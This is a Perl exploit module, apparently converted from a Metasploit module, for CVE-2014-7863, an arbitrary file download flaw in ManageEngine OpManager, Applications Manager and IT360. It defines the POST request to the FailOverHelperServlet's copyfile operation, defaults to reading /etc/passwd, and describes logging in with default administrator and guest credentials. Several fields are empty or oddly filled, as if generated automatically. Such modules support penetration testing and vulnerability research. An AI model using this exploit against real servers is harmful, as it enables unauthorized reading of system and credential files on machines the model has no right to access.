package MANAGEENGINE::MSF::ManageengineFileDownload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ManageengineFileDownload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-7863",
  DESCRIPTION => "

        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet

        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is

        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This

        module will attempt to login using the default credentials for the administrator and

        guest accounts; alternatively you can provide a pre-authenticated cookie or a username

        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually

        8300). This module has been tested on both Windows and Linux with several different

        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is

        a companion module that allows the recursive listing of any directory. This

        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.

      ",
  METHOD => "POST",
  MSF_MODULE => "manageengine_file_download",
  OSVDB => 117695,
  PATH => "servlet,servlet?operation=copyfile&fileName=__FILENAME__&",
  PATHS => ["", "servlet,servlet", "servlet,servlet", "etc/passwd"],
  PAYLOAD => "",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Jan/114",
    "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt",
    "/",
  ],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "Path of the file to download",
  VALUE => "/etc/passwd",
},
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'FILEPATH' =>       { DESCRIPTION => "", VALUE => "" },
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'TIMESTAMP' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
